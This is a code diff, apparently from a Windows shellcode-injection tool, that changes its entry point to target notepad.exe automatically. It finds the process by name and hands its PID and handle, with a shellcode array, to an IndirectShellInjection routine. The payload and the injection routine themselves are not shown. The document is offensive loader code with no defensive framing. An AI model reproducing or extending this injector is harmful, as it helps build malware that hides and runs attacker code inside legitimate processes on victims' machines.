@@ -30,23 +30,24 @@ UCHAR Shellcode[] = {
 
 
 
-int main(int argc, char* argv[])
+int main()
 {
 
-    // make sure user supplies a PID
-    if (argc < 2)
-    {
-        WARN("PID Not Supplied to Inject.exe!");
-        return -1;
-    }
+    DWORD PID;
+    HANDLE hProcess;
 
+    if (!GetRemoteProcID(L"notepad.exe", &PID, &hProcess))
+    {
+        PRINT_ERROR("GetRemoteProcID");
+        return 1;
+    }
 
     size_t sc_size = sizeof(Shellcode);
     INFO("Current Shellcode Address: %p", &Shellcode);
     INFO("Shellcode size: %zu bytes", sc_size);
 
 
-    if (!IndirectShellInjection(atoi(argv[1]), Shellcode, sc_size))
+    if (!IndirectShellInjection(PID, hProcess, Shellcode, sc_size))
     {
         WARN("Injection Failed! Exiting...");
         return -1;
